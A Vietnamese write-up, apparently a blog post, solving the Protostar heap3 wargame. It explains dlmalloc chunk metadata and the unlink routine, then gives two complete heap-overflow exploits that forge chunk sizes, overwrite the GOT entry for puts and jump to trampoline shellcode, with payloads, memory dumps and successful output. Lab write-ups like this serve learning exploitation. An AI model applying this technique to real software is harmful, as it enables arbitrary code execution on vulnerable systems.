---
layout: post
title: heap3
---

Trong bài này, chúng ta sẽ tìm hiểu sâu hơn về một phiên bản malloc do Doug Lea đưa ra, qua đó exploit chương trình dựa trên những hiểu biết này.
Sau đây là source code và asm code của chương trình heap3.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```
```asm
0x08048864 <winner+0>:  push   ebp
0x08048865 <winner+1>:  mov    ebp,esp
0x08048867 <winner+3>:  sub    esp,0x18
0x0804886a <winner+6>:  mov    DWORD PTR [esp],0x0
0x08048871 <winner+13>: call   0x8048780 <time@plt>
0x08048876 <winner+18>: mov    edx,0x804ac00
0x0804887b <winner+23>: mov    DWORD PTR [esp+0x4],eax
0x0804887f <winner+27>: mov    DWORD PTR [esp],edx
0x08048882 <winner+30>: call   0x8048760 <printf@plt>
0x08048887 <winner+35>: leave
0x08048888 <winner+36>: ret
0x08048889 <main+0>:    push   ebp
0x0804888a <main+1>:    mov    ebp,esp
0x0804888c <main+3>:    and    esp,0xfffffff0
0x0804888f <main+6>:    sub    esp,0x20
0x08048892 <main+9>:    mov    DWORD PTR [esp],0x20
0x08048899 <main+16>:   call   0x8048ff2 <malloc>
0x0804889e <main+21>:   mov    DWORD PTR [esp+0x14],eax
0x080488a2 <main+25>:   mov    DWORD PTR [esp],0x20
0x080488a9 <main+32>:   call   0x8048ff2 <malloc>
0x080488ae <main+37>:   mov    DWORD PTR [esp+0x18],eax
0x080488b2 <main+41>:   mov    DWORD PTR [esp],0x20
0x080488b9 <main+48>:   call   0x8048ff2 <malloc>
0x080488be <main+53>:   mov    DWORD PTR [esp+0x1c],eax
0x080488c2 <main+57>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 <main+60>:   add    eax,0x4
0x080488c8 <main+63>:   mov    eax,DWORD PTR [eax]
0x080488ca <main+65>:   mov    DWORD PTR [esp+0x4],eax
0x080488ce <main+69>:   mov    eax,DWORD PTR [esp+0x14]
0x080488d2 <main+73>:   mov    DWORD PTR [esp],eax
0x080488d5 <main+76>:   call   0x8048750 <strcpy@plt>
0x080488da <main+81>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488dd <main+84>:   add    eax,0x8
0x080488e0 <main+87>:   mov    eax,DWORD PTR [eax]
0x080488e2 <main+89>:   mov    DWORD PTR [esp+0x4],eax
0x080488e6 <main+93>:   mov    eax,DWORD PTR [esp+0x18]
0x080488ea <main+97>:   mov    DWORD PTR [esp],eax
0x080488ed <main+100>:  call   0x8048750 <strcpy@plt>
0x080488f2 <main+105>:  mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 <main+108>:  add    eax,0xc
0x080488f8 <main+111>:  mov    eax,DWORD PTR [eax]
0x080488fa <main+113>:  mov    DWORD PTR [esp+0x4],eax
0x080488fe <main+117>:  mov    eax,DWORD PTR [esp+0x1c]
0x08048902 <main+121>:  mov    DWORD PTR [esp],eax
0x08048905 <main+124>:  call   0x8048750 <strcpy@plt>
0x0804890a <main+129>:  mov    eax,DWORD PTR [esp+0x1c]
0x0804890e <main+133>:  mov    DWORD PTR [esp],eax
0x08048911 <main+136>:  call   0x8049824 <free>
0x08048916 <main+141>:  mov    eax,DWORD PTR [esp+0x18]
0x0804891a <main+145>:  mov    DWORD PTR [esp],eax
0x0804891d <main+148>:  call   0x8049824 <free>
0x08048922 <main+153>:  mov    eax,DWORD PTR [esp+0x14]
0x08048926 <main+157>:  mov    DWORD PTR [esp],eax
0x08048929 <main+160>:  call   0x8049824 <free>
0x0804892e <main+165>:  mov    DWORD PTR [esp],0x804ac27
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
0x0804893a <main+177>:  leave
0x0804893b <main+178>:  ret
```

Exploit `malloc` và `free` trong bài này sẽ tương đối phức tạp.
Đã có nhiều bài viết chi tiết từ các tác giá khác nên trong bài viết này, mình chỉ phân tích lý thuyết cơ bản và phân tích kỹ phần ví dụ.
Hy vọng bài viết của mình sẽ giúp các bạn hiểu được logic phía sau cách thức exploit.

Các lý thuyết cơ bản sau đây bạn cần nắm được trước khi đọc phần ví dụ.
* Khi `malloc` xin cấp bộ nhớ cho một biến, các thông tin về kích cỡ bộ nhớ xin cấp sẽ được lưu kèm với dữ liệu; phần lưu thông tin này được gọi là header hoặc meta data.
* Meta data và data kết hợp thành một khối.
* Pointer trả về sau malloc sẽ chỉ đến vùng data; meta data có kích cỡ 8 byte và nằm ngay phía trước data.

Như vậy có thể tưởng tượng cấu trúc một khối như sau:

<pre class="memory">
Khối + 0x00:      0x???????? -> size_t prev_size
Khối + 0x04:      0x???????? -> size_t size (& PREV_INUSE)
Khối + 0x08:      0x???????? -> data
...
</pre>

Lưu ý, khi khởi tạo khối với `malloc`, `prev_size` có thể không tồn tại.
Giá trị này sẽ được cập nhật sau khi khối được `free`.
Ngoài việc cập nhật `prev_size`, khối được `free` sẽ loại bỏ vùng data và thay vào đó là 2 thông tin kiểu meta data có ý nghĩa như 2 địa chỉ hướng đến các khối `free` khác liền sau và liền trước khối này.
Hãy tưởng tượng cấu trúc một khối sau `free` như sau:

<pre class="memory">
Khối + 0x00:      0x???????? -> size_t prev_size
Khối + 0x04:      0x???????? -> size_t size (& PREV_INUSE)
Khối + 0x08:      0x???????? -> Khối* fd
Khối + 0x0c:      0x???????? -> Khối* bk
...
</pre>

Cũng cần lưu ý thêm về `PREV_INUSE`. Đây là một bit được lưu chung với `size`.
Nếu bit này có giá trị 1, nó cho biết rằng khối liền trước khối đang xét không phải là một khối đã `free`, và ngược lại.
Nhấn mạnh rằng, nó mang thông tin về khối liền trước khối đang xét.

Nhìn vào cấu trúc khối, ta thấy rằng, nếu dữ liệu được lưu vào lớn hơn vùng data đã xin cấp, phần tràn ra sẽ làm thay đổi meta data của khối liền sau.
Đây là chính là một cơ sở để exploit chương trình với hàm `malloc`.
Cơ sở tiếp theo đến từ hàm `free`.
Khi `free` được gọi cho một khối, trong quá trình thực hiện `free`, hàm này sẽ cố gắng thu hồi bộ nhớ một cách tối ưu để có thể cấp phát lại về sau.
Với một khối đang xét, cách thức thu hồi như sau:

* Kiểm tra khối liền trước của khối đang xét dựa trên `PREV_INUSE` bit, nếu khối liền trước này đã `free` thì thực hiện `unlink` lên khối liền trước này và cập nhật lại meta data cho cả 2 khối.
* Kiểm tra khối liền sau của khối đang xét dựa trên `PREV_INUSE` bit của khối liền sau của khối này, nếu đã `free` thì thực hiện `unlink` lên khối liền sau này; meta data cũng sẽ được cập nhật lại cho cả 2.

Cụ thể, sau đây là một đoạn code của quy trình này:

```c
//...
  islr = 0;

  if (!(hd & PREV_INUSE))                    /* consolidate backward */
  {
    prevsz = p->prev_size;
    p = chunk_at_offset(p, -(long)prevsz);
    sz += prevsz;

    if (p->fd == last_remainder(ar_ptr))     /* keep as last_remainder */
      islr = 1;
    else
      unlink(p, bck, fwd);
  }
//...
    if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
  {
    sz += nextsz;

    if (!islr && next->fd == last_remainder(ar_ptr))
                                              /* re-insert last_remainder */
    {
      islr = 1;
      link_last_remainder(ar_ptr, p);
    }
    else
      unlink(next, bck, fwd);

    next = chunk_at_offset(p, sz);
  }
  else
    set_head(next, nextsz);                  /* clear inuse bit */

  set_head(p, sz | PREV_INUSE);
  next->prev_size = sz;
  if (!islr)
    frontlink(ar_ptr, p, sz, idx, bck, fwd);
//...
```

Có thể hiểu đơn giản rằng nếu có 2 khối đã `free` nằm liền kề trên bộ nhớ, 2 khối này sẽ được ghép thành 1 khối duy nhất với kích cỡ bằng tổng của cả hai.
Mấu chốt chính là hàm `unlink` được gọi khi trường hợp này xảy ra.
Hàm `unlink` sẽ thực hiện nhũng thứ sau:

```c
#define unlink(P, BK, FD)                                                \
{                                                                        \
  BK = P->bk;                                                            \
  FD = P->fd;                                                            \
  FD->bk = BK;                                                           \
  BK->fd = FD;                                                           \
}
```

Trong đó `P` là khối mà `unlink` được gọi lên.
Về bản chất, `unlink` chỉ được gọi lên các khổi đã `free` để đảm bảo chúng nằm trong một doubly linked list chứa thông tin của tất cả các khối đã `free`.
Với một khối đã `free`, ta sẽ lấy thông meta data của nó, `bk` và `fd`, để biết được khối `free` phía trước và sau, `BK` và `FD`, trong linked list.
`BK` và `FD` cũng được giả thiết là các khối đã `free` khác.
`unlink` sẽ làm nhiệm vụ là loại bỏ `P` ra khỏi linked list, bằng cách loại bỏ các pointer chỉ đến nó.
Cụ thể, `BK->fd`, khối liền sau của `BK`, và `FD->bk`, khối liền trước của `FD` sẽ là 2 pointer cần thay đổi giá trị.
`unlink` sẽ kết nối `BK` và `FD` lại bằng cách gán `BK` vào `FD->bk` và `FD` vào `BK->fd`.

<pre class="memory">
... <==bk== BK ==fd==> <==bk== P ==fd==> <==bk== FD ==fd==> ...
</pre>

<pre class="memory">
... <==bk== BK ==fd==> <==bk== FD ==fd==> ...
</pre>

Quá trình kết nối này có ghi vào bộ nhớ.
Đây là cơ sở thứ 2 để exploit chương trình.

Kết hợp 2 cơ sở trên, ta có thể thử như sau:

* Dùng `malloc` để khởi tạo các khối.
* Dùng `strcpy` với data cụ thể để làm tràn và thay đổi meta data của các khối; ta sẽ tạo ra các khối theo ý của mình.
* Dùng `free` để thực hiện ghi lên bộ nhớ thông qua `unlink`; khối tạo ra ở bước trước cần đảm bảo `unlink` sẽ được thực hiện.
* Vị trí để ghi lên bộ nhớ được xác định trước và điều khiển ở bước tạo khối giả.

Tuy nhiên, các lưu ý sau đây rất quan trọng để có thể exploit đúng như giả thuyết đặt ra trên.

1. Các cấu trúc khối đã đưa ra (meta data, data, v.v..) chỉ áp dụng cho khối có kích cỡ đủ lớn (có thể trên 64 byte hoặc trên 100 byte); như vậy, kích cỡ khối mặc định (32 byte) trong chương trình heap3 là không đủ.
2. Để tính được vị trí khối liền sau hay liền trước, ta sẽ lấy địa chỉ của khối đang xét cộng hoặc trừ đi `size` hoặc `prev_size` tương ứng.
3. Khi tính vị trí bằng `prev_size` hay `size`, ta thấy trong đoạn source code phía trên, các biến này được cast giá trị signed, thay vì dùng giá trị unsigned mặc định; như vậy nếu `size = 0xfffffffc`, khối vẫn đủ lớn để lưu ý 1 được áp dụng, trong khi việc tính khối tiếp theo sẽ là `size + (-0x04)` đi "ngược" lại hướng liền sau thông thường.
4. `strcpy` không thể copy null byte (`0x00`); do đó lưu ý số 3 có thể được dùng để tạo khổi đủ lớn cho lưu ý 1 mà không vượt quá giới hạn của heap.
5. Cần đảm bảo rằng vùng bộ nhớ khi `unlink` ghi vào phải là vùng writable và khi ghi, địa chỉ được ghi vào có offset (`0x08` hoặc `0x0c` cho `->fd` và `->bk`).

Trong các bài trước, chúng ta sẽ sử dụng phương thức ghi vào GOT để điều hướng hàm `printf`/`puts` đến `winner`.
Giả sử phương thức tương tự được thực hiện trong bài này, ta sẽ cần 2 địa chỉ:

* Địa chỉ của GOT chứa symbol của `printf`/`puts`; địa chỉ này là `0x0804b128`.
* Địa chỉ của hàm `winner`; địa chỉ này là `0x08048864`.

`unlink` sẽ ghi chéo `0x0804b128` (hoặc offset của nó) vào `0x08048864` (hoặc offset của nó) và ngược lại.
Tuy nhiên, mọi thứ sẽ cần phức tạp hơn một chút, vì `0x08048864` là vùng .text nên không thể ghi vào được.
Để giải quyết vấn đề này, chúng ta sẽ dùng chính `strcpy` và các buffer được ghi vào heap để ghi một đoạn code có tác dụng điều hướng đến `winner`.
Đây là phương thức kiểu bắc cầu, có tên thường gọi là "trampoline", vì đoạn code ghi vào heap chỉ là code chuyển tiếp đến hàm cần chạy là `winner`.
Với đoạn code chuyển tiếp này, ta có thể dùng các lệnh sau:

```asm
mov eax, 0x08048864
call eax
ret
```

```bash
python -c 'print "\xb8\x64\x88\x04\x08\xff\xd0\xc3"'
```

Thêm một lưu ý khi sử dụng trampoline code qua buffer lưu trên heap, đó là trong heap3, chúng ta không chỉ có 1 lần `free` được gọi và sau `free` thì có sự thay đổi/update meta data.
Do vậy, trampoline code này nên được lưu các xa các vùng này để tránh bị ghi đè lên do hàm `free` được gọi về sau gây nên.

## Ví dụ 1: unlink khối liền sau

Chúng ta sẽ thiết kế các buffer như sau:

* buffer 1 lưu vào khối đầu tiên sẽ chứa trampoline code
* buffer 2 lưu tràn khối thứ 2 sang meta data của khối 3 để thay đổi `size` và kích hoạt cấu trúc của khối 3.
* buffer 3 sẽ lưu tràn hết `size` mới của khối 3, sau đó tính toán để tạo ra khối giả thứ 4 với meta data và các địa chỉ liên quan.

Logic của chương trình với các buffer này bắt đầu khi `free` được gọi cho khối thứ 3

1. `size` mới của khối 3 có `PREV_INUSE` bit bằng 1 để loại bỏ `unlink` khối liên trước nó; trong ví dụ này, chúng ta chỉ tập trung `unlink` khối liền sau.
2. Khối giả sẽ ở địa chỉ bằng với `size` mới cộng với địa chỉ khối thứ 3; khi đã có địa chỉ này, ta bắt đầu ghi meta data với 4 byte đầu là `prev_size`, 4 byte kế tiếp là `size`, 8 byte cuối chứa địa chỉ đến GOT và trampoline.

Ta sẽ chọn `size` và `prev_size` cho khối giả là `0xfffffffc`. Khi kiểm tra khối giả có phải là khối đã `free` không, chương trình sẽ kiểm tra khối giả thứ 5 khác có địa chỉ offset -4 byte (4 byte phía trước) của khối giả thứ 4 chúng ta tạo ra.
Lúc này, `prev_size` của khối giả thứ 4 chính là `size` của khối giả thứ 5.
`PREV_INUSE` bit bằng 0 cho phép `unlink` được kích hoạt lên khối giả thứ 4.

Sau đây là các buffer theo thiết kế đưa ra.

```bash
python -c 'print "AAAA" *  2 + "\xb8\x64\x88\x04\x08\xff\xd0\xc3"'
python -c 'print "BBBB" *  8 + "CCCC" + "\x65"'
python -c 'print "DDDD" * 23 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"'
```

Chúng ta sẽ chọn `size` mới cho khối thứ 3 là 100 byte hay `0x64`. Với bit cuối bằng 1, giá trị cần ghi vào là `0x65`
Trampoline code sẽ có ở `0x0804c010`. Trampoline code có độ dài 8 byte.
Bộ nhớ ngay trước lệnh `free` đầu tiên như bên dưới, trong đó đã highlight <span style="color:springgreen">trampoline code</span> và <span style="color:aqua">khối giả thứ 4</span>
Địa chỉ được `free` là `0x0804c058`. Do đó, khối sẽ được `free` có địa chỉ là `0x0804c050`.
Lúc này, `0x0804c050` chứa `prev_size`, `0x0804c054` chứa `size`, và `0x0804c058` chứa data.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      <span style="color:springgreen">0x048864b8</span>      <span style="color:springgreen">0xc3d0ff08</span>      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0x43434343      0x00000065      0x44444444      0x44444444
0x804c060:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c070:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c080:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c090:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c0a0:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c0b0:      0x44444444      <span style="color:aqua">0xfffffffc</span>      <span style="color:aqua">0xfffffffc</span>      <span style="color:aqua">0x0804b11c</span>
0x804c0c0:      <span style="color:aqua">0x0804c010</span>      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
</pre>

Hãy cùng soát lại một lượt logic của chương trình exploit.

Khi `free` được gọi lên khối thứ 3, vì khối liền trước đang được sử dụng, sẽ không có `unlink` được gọi cho khối đó.
Hàm `free` sẽ tiếp tục kiểm tra khối liền sau. Để biết được khối liền sau có đang được dùng không, hàm này sẽ tìm đến khối liền sau của khối liền sau.

Theo đúng thứ tự, khối liền sau sẽ ở địa chỉ `0x0804c050 + 0x64 = 0x0804c0b4` (địa chỉ khối hiện tại, cộng với kích cỡ của chính nó).
Tại địa chỉ này, meta data của khối là `prev_size` ở `0x0804c0b4`, `size` ở `0x0804c0b8`.

Như vậy, khối liền sau của khối liền sau được tính bằng công thức tương tự: `0x0804c0b4 + 0xfffffffc`.
Ở đây, do `0xfffffffc` đã overflow, giá trị được cộng vào để tính địa chỉ sẽ là `-0x04`.
Suy ra, địa chỉ của khối liền sau của khối liền sau là `0x0804c0b4 - 0x04 = 0x0804c0b0`.
Meta data của khối này là `prev_size` ở `0x0804c0b0`, `size` ở `0x0804c0b4`.

Khi kiểm tra `size` của khối liền sau của khối liền sau này, bit cuối cùng là 0.
Do vậy, khối liền sau của khối đang xét là khối trống. Theo sau `prev_size` và `size` trong meta data của khối trống sẽ là 2 địa chỉ, 1 là của khối liền sau nó, và 1 là của khối liên trước nó.
Cụ thể 2 địa chỉ này nằm tại `0x0804c0bc` và `0x0804c0c0` với các giá trị tương ứng là `0x0804b11c` và `0x0804c010`.
Lúc này, điều kiện của `unlink` đã thỏa mãn nên hàm này sẽ được gọi cho khối liền sau.

Từ định nghĩa của `unlink` phía trên, ta sẽ tính các thông tin liên quan.
Pointer `FD` sẽ có giá là `0x0804b11c`. Khi gán giá trị của `BK` vào `FD->bk` (ở dòng thứ 3 trong `unlink`), `FD->bk` sẽ được tính là offset 12 byte của `FD`.
Đây là lý do `0x0804b11c` được chọn thay cho giá trị gốc trên GOT `0x0804b128`.
`FD->bk = FD + 0x0c` hay `0x0804b11c + 0x0c = 0x0804b128`, và giá trị được lưu vào đây là `BK = 0x0804c010`.
Tương tự với `BK`. Khi gán giá trị của `FD` vào `BK->fd`, trước tiên, ta tính được địa chỉ của `BK->fd = 0x0804c010 + 0x08 = 0x0804c018`.
Offset cho `->fd` là 8 byte. Giá trị lưu vào địa chỉ này sẽ là `0x0804b11c`.
Rất may mắn vì trampoline code có đúng 8 byte nên giá trị lưu vào `BK->fd` không làm thay đổi trampoline code.
Đây cũng là một lưu ý quan trọng.
Sau hai bước này, bộ nhớ sẽ chuyển thành như sau. Các thay đổi được highlight.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x048864b8      0xc3d0ff08      <span style="color:springgreen">0x0804b11c</span>      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0x43434343      <span style="color:aqua">0x00000061</span>      <span style="color:orangered">0x0804b194</span>      <span style="color:orangered">0x0804b194</span>
0x804c060:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c070:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c080:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c090:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c0a0:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c0b0:      <span style="color:aqua">0x00000060</span>      0xfffffffc      0xfffffffc      0x0804b11c
0x804c0c0:      0x0804c010      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
...
0x804b11c <_GLOBAL_OFFSET_TABLE_+52>:   0x08048766      0x08048776      0x08048786      <span style="color:springgreen">0x0804c010</span>
0x804b12c <_GLOBAL_OFFSET_TABLE_+68>:   0x080487a6      0x00000000      0x00000000      0x00000000
</pre>

Có thể thấy, ngoài thay đổi về giá trị được lưu sau `unlink`, chúng ta còn có thay đổi về `size` của khối được free, <span style="color:aqua">highlight</span>. `size` mới được tính bằng `size` của khối đang xét cộng thêm `size` của khối liền sau.
Với ví dụ trên, `size` mới là `0x64 - 0x04 = 0x60`. Lưu ý, bit cuối vẫn được đặt là 1, nên giá trị lưu ở `size` là `0x61`.
Sau khi `unlink` thì khối đang xét cũng trở thành khối liên trước của khối liền sau của khối liền sau nó.
`prev_size` của khối liền sau của khối liền sau lúc này cũng được cập nhật bằng với `size` mới.
Cụ thể, `prev_size` được gán giá trị `0x60`.

Tiếp nữa, khối đang xét trở thành một khối trống nên 2 dword sau meta data của nó cũng được thay đổi cho phù hợp như <span style="color:orangered">highlight</span>.
2 vị trí này nằm ở địa chỉ `0x0804c058` và `0x0804c05c`.

Tại sao chúng được đặt thành `0x0804b194` thì mình chưa rõ! Giá trị này có vẻ là head của doubly linked list dùng để lưu những vị trí đã được free trên heap.

Trước khi chạm đến hàm `winner`, ta sẽ kiểm tra nốt bộ nhớ sau 2 lần `free` cho các khối thứ 1 và 2.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      <span style="color:orangered">0x0804c028</span>      0x41414141
0x804c010:      0x048864b8      0xc3d0ff08      0x0804b11c      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      <span style="color:orangered">0x00000000</span>      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0x43434343      0x00000061      0x0804b194      0x0804b194
0x804c060:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c070:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c080:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c090:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c0a0:      0x44444444      0x44444444      0x44444444      0x44444444
0x804c0b0:      0x00000060      0xfffffffc      0xfffffffc      0x0804b11c
0x804c0c0:      0x0804c010      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
</pre>

Có 2 thay đổi nằm ở vị trí liên quan đến meta data của khối thứ 1 và 2.
Những thay đổi này không làm ảnh hưởng đến mục đích exploit của chương trình như đã tính toán trước.
Sau đây là kết quả của chương trình.

```bash
heap3 $(python -c 'print "AAAA" *  2 + "\xb8\x64\x88\x04\x08\xff\xd0\xc3"') $(python -c 'print "BBBB" *  8 + "CCCC" + "\x65"') $(python -c 'print "DDDD" * 23 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"')
```

<pre class="memory">
that wasn't too bad now, was it? @ 1688030376
</pre>

Mục tiêu đã hoàn thành!

## Ví dụ 2: unlink khối liền trước
Sau đây là một lời giải cực gọn, chỉ sử dụng đến 2 buffer thứ 2 và 3 và cũng không cần mở rộng bộ nhớ của khối thứ 3 như ví dụ trước.

```bash
python -c 'print "A"'
python -c 'print "BBBB" * 2 + "\xb8\x64\x88\x04\x08\xff\xd0\xc3" + "CCCC" * 4 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"'
python -c 'print "\xff\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x38\xc0\x04\x08"'
```

Để giải thích về 3 buffer này, đầu tiên chúng ta bỏ qua buffer thứ 1 và khối thứ 1.
Đối với buffer thứ 2, chúng ta sẽ không ghi thông tin quan trọng vào 8 byte đầu tính từ vùng data để tránh khi `free` khối thứ 2 có thể thay đổi vùng này.
8 byte tiếp theo, chúng ta sẽ ghi trampoline code lên đây. Địa chỉ của trampoline code lúc này là `0x0804c038`.
Tiếp theo chúng ta cần ghi đến hết vùng data của khối thứ 2 với 16 byte còn lại.
8 byte kế tiếp dùng để làm tràn và thay đổi meta data của khối thứ 3.
Chúng ta chọn `size` và `prev_size` tương tự như ví dụ trước, đó là cả 2 đều có giá trị `0xfffffffc`.
Khi `free` được gọi lên khối thứ 3, giá trị `size` của nó có bit cuối bằng 0 nên `unlink` được áp dụng lên khối liền trước nó.
Lúc này, khối liền trước nó có địa chỉ là `0x0804c050 - (-0x04) = 0x0804c050 + 0x04 = 0x0804c054`.
Các địa chỉ quan trọng cho `unlink` sẽ là `0x0804c054 + 0x08 = 0x0804c05c` và `0x0804c054 + 0x0c = 0x0804c060`
Vì khối thứ 3 với địa chỉ bắt đầu lưu data từ `strcpy` là `0x804c058`, ta sẽ thiết kế buffer thứ 3 bỏ qua 4 byte đầu tiên, và 8 byte tiếp theo lưu 2 địa chỉ GOT đã offset, `0x0804b11c`, và trampoline, `0x0804c038`.

Sau đây là bộ nhớ ngay trước lệnh `free` đầu tiên, trong đó đã highlight <span style="color:springgreen">trampoline code</span> và <span style="color:aqua">khối giả được áp dụng unlink</span>

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x00000041      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      <span style="color:springgreen">0x048864b8</span>      <span style="color:springgreen">0xc3d0ff08</span>
0x804c040:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c050:      0xfffffffc      <span style="color:aqua">0xfffffffc</span>      <span style="color:aqua">0xffffffff</span>      <span style="color:aqua">0x0804b11c</span>
0x804c060:      <span style="color:aqua">0x0804c038</span>      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
</pre>

Sau khi áp dụng `unlink`, khối liền trước và khối đang xét được nhật `size` và `prev_size`.
Khối liền trước được coi là đã "nuốt" khối đang xét.
Giá trị `size` mới sẽ được tính bằng `size` và `prev_size` của khối đang xét. Lưu ý `size` của khối liền trước không được tính đến/không cần quan tâm.
Giá trị mới sẽ là `(-0x04) + (-0x04) = -0x08 = 0xfffffff8`.
Bit cuối chứa thông tin của khối liền trước của khối liền trước được giữ nguyên, là 1.
Do đó, giá trị được lưu lại là `0xfffffff9`.

Khối liền sau dù không được `unlink` nhưng `prev_size` của khối này vẫn được cập nhật. Giá trị được cập nhật chính là giá trị `size` mới đã tính phía trên, với bit cuối được đặt về 0.
Giá trị cụ thể là `0xfffffff8`.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x00000041      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x048864b8      0xc3d0ff08
0x804c040:      <span style="color:springgreen">0x0804b11c</span>      0x43434343      0x43434343      <span style="color:aqua">0xfffffff8</span>
0x804c050:      0xfffffffc      0xfffffffc      <span style="color:aqua">0xfffffff9</span>      <span style="color:orangered">0x0804b194</span>
0x804c060:      <span style="color:orangered">0x0804b194</span>      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
...
0x804b11c <_GLOBAL_OFFSET_TABLE_+52>:   0x08048766      0x08048776      0x08048786      <span style="color:springgreen">0x0804c038</span>
0x804b12c <_GLOBAL_OFFSET_TABLE_+68>:   0x080487a6      0x00000000      0x00000000      0x00000000
</pre>

Khối đang xét trở thành một khối trống nên 2 dword sau meta data của nó cũng được thay đổi cho phù hợp như <span style="color:orangered">highlight</span>.
Giá trị này vẫn `0x0804b194` như trong ví dụ trước. Có vẻ đó là head của doubly linked list dùng để lưu những vị trí đã được free trên heap.

Trước khi chạm đến hàm `winner`, ta sẽ kiểm tra nốt bộ nhớ sau 2 lần `free` cho các khối thứ 1 và 2.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      <span style="color:orangered">0x0804c028</span>      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      <span style="color:orangered">0x00000000</span>      0x42424242      0x048864b8      0xc3d0ff08
0x804c040:      0x0804b11c      0x43434343      0x43434343      0xfffffff8
0x804c050:      0xfffffffc      0xfffffffc      0xfffffff9      0x0804b194
0x804c060:      0x0804b194      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
</pre>

Thay đổi là có nhưng không làm ảnh hưởng đến mục đích.
Sau đây là kết quả của chương trình.

```bash
heap3 $(python -c 'print "A"') $(python -c 'print "BBBB" * 2 + "\xb8\x64\x88\x04\x08\xff\xd0\xc3" + "CCCC" * 4 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\xff\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x38\xc0\x04\x08"')
```

<pre class="memory">
that wasn't too bad now, was it? @ 1688032259
</pre>

Mục tiêu đã hoàn thành!

heap3 có thể coi là bài exploit hay và khó nhất tính đến hiện tại.

## Ref
```bash
user@protostar:~$ heap3 $(python -c 'print "AAAA" *  2 + "\xb8\x64\x88\x04\x08\xff\xd0\xc3"') $(python -c 'print "BBBB" *  8 + "CCCC" + "\x65"') $(python -c 'print "DDDD" * 23 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x10\xc0\x04\x08"')
that wasn't too bad now, was it? @ 1688030376
```

```bash
user@protostar:~$ heap3 $(python -c 'print "A"') $(python -c 'print "BBBB" * 2 + "\xb8\x64\x88\x04\x08\xff\xd0\xc3" + "CCCC" * 4 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\xff\xff\xff\xff" + "\x1c\xb1\x04\x08" + "\x38\xc0\x04\x08"')
that wasn't too bad now, was it? @ 1688032259
```
